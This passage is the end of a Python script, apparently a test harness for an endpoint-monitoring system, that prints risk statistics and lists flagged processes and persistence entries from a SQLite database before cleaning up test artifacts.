    Medium:            {C.YELLOW}{stats['medium']}{C.RESET}
    Low:               {C.CYAN}{stats['low']}{C.RESET}
    Max risk score:    {max_risk:.2f}
    Agents reporting:  {stats['agents_reporting']}
""")

    # Show process detections
    proc_sus = conn.execute("""
        SELECT pid, exe, cmdline, is_suspicious, anomaly_score
        FROM process_events
        WHERE is_suspicious = 1
        ORDER BY anomaly_score DESC
        LIMIT 20
    """).fetchall()

    if proc_sus:
        print(f"  {C.RED}{C.BOLD}FLAGGED PROCESSES:{C.RESET}")
        for p in proc_sus:
            exe = (p["exe"] or "?")
            cmd = (p["cmdline"] or "")[:60]
            print(f"    PID {p['pid']:>6}  {exe}  {C.DIM}{cmd}{C.RESET}")

    # Show persistence detections
    persist_sus = conn.execute("""
        SELECT mechanism, path, risk_score
        FROM persistence_events
        WHERE risk_score > 0.3
        ORDER BY risk_score DESC
        LIMIT 20
    """).fetchall()

    if persist_sus:
        print(f"\n  {C.RED}{C.BOLD}FLAGGED PERSISTENCE:{C.RESET}")
        for p in persist_sus:
            print(f"    [{p['mechanism']}] {p['path']}  risk={p['risk_score']:.1f}")

    conn.close()

    # ── Phase 4: Cleanup ─────────────────────────────────────────────────
    if not args.no_cleanup:
        cleanup()
    else:
        print(f"\n{C.YELLOW}--no-cleanup: Artifacts left in place for inspection.{C.RESET}")
        print(f"{C.YELLOW}Run this script again without --no-cleanup to remove them.{C.RESET}")


if __name__ == "__main__":
    main()
